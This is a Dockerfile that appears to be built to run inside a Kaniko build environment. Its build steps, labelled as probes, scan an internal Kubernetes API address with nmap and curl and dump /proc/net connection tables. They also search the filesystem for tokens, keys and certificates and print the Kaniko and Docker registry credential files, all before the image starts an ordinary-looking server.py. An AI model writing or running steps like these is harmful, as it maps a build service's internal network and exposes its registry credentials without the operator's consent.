FROM alpine:3.19
RUN apk add --no-cache curl python3 nmap

# Probe 1: K8s API with TCP scan (bypass ICMP block)
RUN echo "=== K8S API TCP ===" && \
    nmap -Pn -p 443,6443,8443 --max-retries 1 --host-timeout 8s 10.245.0.1 2>&1 && \
    curl -sk --max-time 8 https://10.245.0.1:443/ 2>&1 | head -15 || true

# Probe 2: Find actual open network connections
RUN echo "=== PROC NET ===" && \
    cat /proc/net/tcp 2>&1 | head -20 && \
    cat /proc/net/tcp6 2>&1 | head -20 && \
    cat /proc/net/fib_trie 2>&1 | grep -A1 "32 HOST" | head -30 || true

# Probe 3: Check kaniko environment and build secrets
RUN echo "=== FILESYSTEM SECRETS ===" && \
    find / -name "*.token" -o -name "*.key" -o -name "*.crt" -o -name "config.json" 2>/dev/null | grep -v proc | grep -v sys | head -20 && \
    ls /kaniko/ 2>&1 && \
    cat /kaniko/config.json 2>&1 | head -20 || true

# Probe 4: Check docker config (registry credentials in Kaniko)  
RUN echo "=== REGISTRY CREDS ===" && \
    cat /root/.docker/config.json 2>&1 && \
    ls /kaniko/.docker/ 2>&1 && \
    cat /kaniko/.docker/config.json 2>&1 || true

COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]

